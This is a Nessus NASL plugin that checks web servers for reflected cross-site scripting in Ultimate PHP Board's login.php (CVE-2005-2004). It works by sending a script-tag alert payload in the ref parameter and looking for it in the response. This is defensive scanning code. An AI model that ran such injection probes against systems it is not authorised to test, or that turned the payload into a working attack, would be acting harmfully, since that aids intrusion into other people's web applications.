#
# This script was written by Josh Zlatin-Amishav <josh at ramat dot cc>
#
# This script is released under the GNU GPLv2

include("compat.inc");

if(description)
{
 script_id(19498);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2005-2004");
 script_bugtraq_id(13971);
 script_xref(name:"OSVDB", value:"17365");
 script_xref(name:"OSVDB", value:"17366");
 script_xref(name:"OSVDB", value:"17367");
 script_xref(name:"OSVDB", value:"17368");
 script_xref(name:"OSVDB", value:"17369");
 script_xref(name:"OSVDB", value:"17370");
 script_xref(name:"OSVDB", value:"17371");
 script_xref(name:"OSVDB", value:"17372");
 script_xref(name:"OSVDB", value:"17373");

 script_name(english:"Ultimate PHP Board 1.9.6 GOLD Multiple Scripts XSS (2)");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has multiple cross-site
scripting vulnerabilities."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running Ultimate PHP Board (UPB).  The remote
version of this software is affected by several cross-site scripting
vulnerabilities.  These issues are due to a failure of the
application to properly sanitize user-supplied input."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://securityfocus.com/archive/1/402461"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.myupb.com/forum/viewtopic.php?id=26&t_id=118"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to UPB 2.2.6 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

 summary["english"] = "Checks for XSS in login.php";

 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);

 script_family(english:"CGI abuses : XSS");
 script_copyright(english:"Copyright (C) 2005-2009 Josh Zlatin-Amishav");

 script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");
include("global_settings.inc");

if (report_paranoia < 2) exit(0);


port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);
if ( get_kb_item("www/"+port+"/generic_xss") ) exit(0);

# A simple alert.
xss = "'><script>alert(" + SCRIPT_NAME + ")</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);

foreach dir ( cgi_dirs() )
{
 req = http_get(
   item:string(
     dir, "/login.php?ref=",
     exss
   ), 
   port:port
 );


 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

 if ( xss >< res )
 {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
 }
}
